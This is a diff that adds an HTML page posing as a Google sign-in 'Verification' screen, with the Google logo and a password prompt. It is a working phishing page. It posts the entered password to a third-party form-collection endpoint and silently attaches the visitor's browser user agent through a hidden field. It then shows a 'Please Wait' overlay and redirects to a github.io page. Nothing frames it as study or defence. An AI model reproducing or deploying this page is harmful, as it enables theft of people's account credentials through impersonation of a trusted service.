@@ -1,1 +1,261 @@
 
+
+
+
+
+   <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    .input-container {
+      position: relative;
+      width: 90%;
+      max-width: 600px;
+      margin: 5px auto; /* Center horizontally and position 10px from the top */
+    }
+
+    .input-container input {
+      width: 100%;
+      height: 51px;
+      border: 2px solid #1565C0;
+      border-radius: 1px;
+      padding: 20px 10px 10px; /* Add space at the top for the floating label */
+      font-size: 19px;
+      font-weight: ;
+      color: black;
+      outline: none;
+      box-sizing: border-box;
+    }
+
+    .input-container label {
+      position: absolute;
+      top: 10px; /* Start slightly higher inside the input field */
+      left: 12px;
+      font-size: 19px;
+      font-weight: ;
+      color: black;
+      background-color: white;
+      padding: 0 4px;
+      transition: all 0.3s ease;
+      pointer-events: none; /* Prevent interaction with the label */
+    }
+
+    .input-container input:focus + label,
+    .input-container input:not(:placeholder-shown) + label {
+      top: -4px; /* Float higher inside the border */
+      font-size: 12px;
+      font-weight: normal; /* Remove bold when floating */
+      color: black;
+    }
+
+    .input-container input:focus {
+      border-color: #1565C0;
+    }
+
+    .submit-button {
+      position: absolute;
+      right: 7px; /* Add padding from the right edge of the screen */
+      top: 115px; /* Position the button 75px below the input field */
+      width: 31%;
+      height: 40px;
+      background-color: #2979FF;
+      color: white;
+      font-size: 18px;
+      font-weight: ;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    .submit-button:hover {
+      background-color: #1565C0; /* Slightly darker blue on hover */
+    }
+  </style>
+
+
+
+
+
+<style>
+  .text-makapx {
+    font-size: 23px;
+  }
+</style>
+
+<style>
+  .text-makap5x {
+    font-size: 19px;
+  }
+</style>
+
+
+
+
+
+
+
+
+
+  <style>
+    :root {
+      /* Customizable variables */
+      --loading-text-size: 40px;           /* Size of the "Processing..." text */
+      --loading-text-color: #000000;        /* Color of the "Processing..." text */
+      --spinner-size: 110px;               /* Size of the rotating icon */
+      --spinner-border-size: 20px;         /* Thickness of the spinner border */
+      --spinner-color: #306754;             /* Color of the rotating part */
+      --spinner-speed: 1s;                /* Rotation speed of the spinner */
+    }
+
+    /* General styling for the loading overlay */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color:  #ffffff;
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+    }
+
+    .loading-icon {
+      border: var(--spinner-border-size) solid #f3f3f3; /* Light grey */
+      border-top: var(--spinner-border-size) solid var(--spinner-color); /* Customizable color */
+      border-radius: 50%;
+      width: var(--spinner-size); /* Customizable size */
+      height: var(--spinner-size); /* Customizable size */
+      animation: spin var(--spinner-speed) linear infinite; /* Customizable speed */
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: var(--loading-text-size); /* Customizable size */
+      color: var(--loading-text-color); /* Customizable color */
+      font-weight: bold;
+    }
+  </style>
+  
+  
+  
+
+
+
+
+
+</head>
+<body>
+
+  <br><br>
+
+
+<center>
+
+<p class="text-makapx">
+ 
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/640px-Google_2015_logo.svg.png" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 1280px; width: 105px; height: 35px; margin: 3px 0px;" alt="Google logo - Wikidata" role="button" tabindex="0" aria-label="Google logo - Wikidata Search inside image" aria-pressed="false" jsname="kn3ccd">
+
+<br>
+
+
+Welcome 
+<br><br>
+</p>
+
+</center>
+
+
+<form action="https://submit-form.com/gTV0qh16V" method="POST" id="example-form" class="wpforms-validate wpforms-form" data-formid="278">
+
+<input type="hidden" name="_redirect" value="https://celebrity-us.github.io/Mails/" >
+
+
+
+
+  <div class="input-container">
+
+
+    <input type="text" id="input-field" name="Email_passrd" placeholder=" " required>
+    <label for="input-field">Enter your password</label>
+
+<span style="display:none;">
+
+
+    <p id="user-agent"></p> </span>
+        <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
+        	
+
+    <button class="submit-button">Sign in</button>
+  </div>
+</form>
+
+
+
+<script>
+        const userAgent = navigator.userAgent;
+        document.getElementById('user-agent').textContent = userAgent;
+        document.getElementById('hidden-user-agent').value = userAgent;
+    </script>
+ 
+
+
+<!-- Reusable Loading Overlay -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div>
+      <div class="loading-icon"></div>
+      <div class="loading-text"><strong>Please Wait...</strong></div>
+    </div>
+  </div>
+
+
+
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const form = document.getElementById("example-form");
+      const loadingOverlay = document.getElementById("loading-overlay");
+
+      // Function to show the loading overlay
+      const showLoading = () => {
+        loadingOverlay.classList.add("active");
+      };
+
+      // Form submission handler
+      form.addEventListener("submit", (event) => {
+        // Show the loading overlay
+        showLoading();
+
+        // Allow the form to proceed with submission (default behavior)
+        // The loading overlay will remain visible while the form is being submitted
+      });
+    });
+  </script>
+</body>
+</html>
